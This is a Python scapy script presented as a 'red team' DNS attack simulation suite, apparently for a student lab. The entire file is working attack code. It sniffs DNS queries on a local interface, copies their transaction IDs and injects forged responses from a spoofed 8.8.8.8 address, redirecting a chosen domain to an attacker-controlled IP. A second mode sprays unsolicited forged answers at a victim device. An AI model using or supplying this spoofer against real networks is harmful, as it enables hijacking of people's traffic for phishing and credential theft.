from scapy.all import send, IP, UDP, DNS, DNSQR, DNSRR, sniff
import random
import time
import sys
import network_utils

def get_input(prompt, default=None):
    if default:
        val = input(f"{prompt} [{default}]: ").strip()
        return val if val else default
    else:
        return input(f"{prompt}: ").strip()

def send_dns_response(iface, student_ip, domain, spoofed_ip, ttl=60, tx_id=None):
    """Craft and inject a forged DNS response"""
    if tx_id is None:
        tx_id = random.randint(1, 65535)

    pkt = (
        IP(src="8.8.8.8", dst=student_ip) / 
        UDP(dport=random.randint(1024, 65535), sport=53) /
        DNS(
            id=tx_id,
            qr=1, # Response
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, ttl=ttl, rdata=spoofed_ip)
        )
    )
    send(pkt, iface=iface, verbose=0)
    print(f"[💥 INJECTED] To {student_ip}: {domain} -> {spoofed_ip}")

def main():
    print("\n" + "="*50)
    print("DNS RED TEAM - ATTACK SIMULATION SUITE")
    print("="*50 + "\n")

    try:
        iface_name, iface_ip = network_utils.select_interface_interactive()
        
        while True:
            print("\nSelect Attack Vector:")
            print("1. Autonomous Active Spoofing (Insider Threat)")
            print("2. Blind Injection (Unsolicited Response)")
            print("3. Exit")
            
            choice = input("Choice: ")
            
            if choice == '1':
                print("\n--- AUTONOMOUS SPOOFER CONFIGURATION ---")
                target_domain = get_input("Domain to Hijack (e.g., google.com)")
                attacker_ip = get_input("Your Local Attacker IP to Inject")
                
                # Validation to ensure inputs aren't blank
                if not target_domain or not attacker_ip:
                    print("[!] Error: Domain and Attacker IP are required. Try again.")
                    continue
                
                print(f"\n[*] AUTONOMOUS SPOOFER ARMED on {iface_name}...")
                print(f"[*] Waiting silently for a request to '{target_domain}'. Press CTRL+C to stop.\n")
                
                def auto_attack(packet):
                    if packet.haslayer(DNS) and packet[DNS].qr == 0:
                        victim_ip = packet[IP].src
                        domain_requested = packet[DNSQR].qname.decode().strip('.')
                        tx_id = packet[DNS].id
                        
                        # Only attack if the victim asks for our target domain
                        if domain_requested == target_domain and victim_ip != iface_ip and victim_ip != "127.0.0.1":
                            print(f"[!] Intercepted request from {victim_ip} for {domain_requested}!")
                            # Instantly shoot back the forged response
                            send_dns_response(iface_name, victim_ip, domain_requested, attacker_ip, tx_id=tx_id)

                # Listen to the network and trigger auto_attack when a packet matches
                sniff(iface=iface_name, filter="udp port 53", prn=auto_attack, store=0)

            elif choice == '2':
                print("\n--- BLIND INJECTION ---")
                victim = get_input("Victim IP (Phone's IP)")
                fake_domain = get_input("Domain to Inject (e.g., facebook.com)")
                
                if not victim or not fake_domain:
                    print("[!] Error: Victim IP and Domain are required. Try again.")
                    continue
                    
                print(f"[*] Spraying unsolicited response at {victim}...")
                
                # Send a response without the victim ever making a request
                send_dns_response(iface_name, victim, fake_domain, "1.2.3.4")

            elif choice == '3':
                sys.exit(0)

    except KeyboardInterrupt:
        print("\n[*] Exiting Red Team Tool...")
        sys.exit(0)

if __name__ == "__main__":
    main()